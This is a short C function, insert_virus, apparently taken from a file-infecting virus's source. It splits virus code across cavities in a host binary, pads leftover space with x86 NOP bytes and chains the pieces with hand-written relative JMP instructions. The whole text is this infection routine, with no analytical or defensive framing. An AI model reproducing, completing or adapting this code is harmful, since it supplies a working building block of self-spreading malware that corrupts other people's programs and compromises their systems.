static int insert_virus(cell_t *i, cell_t *c)
{
	int l;
	for (l = 0; c != NULL; )
	        if (l + c->len <= (c->next ? i->len - 5 : i->len)) {
			memcpy(i->ptr + l, c->ptr, c->len);
			l += c->len;
			c = c->next;
		} else {
			int n;
			for (n = l; n < i->len; n++)
				i->ptr[n] = 0x90;
			if (i->next != NULL) {
				*((uint8_t *)(i->ptr + l)) = 0xe9;
				*((uint32_t*)(i->ptr + l + 1)) = i->next->ptr - i->ptr - l - 5;
			} else {
				return 1;
			}
			i = i->next;
			l = 0;
		}
	return 0;
}
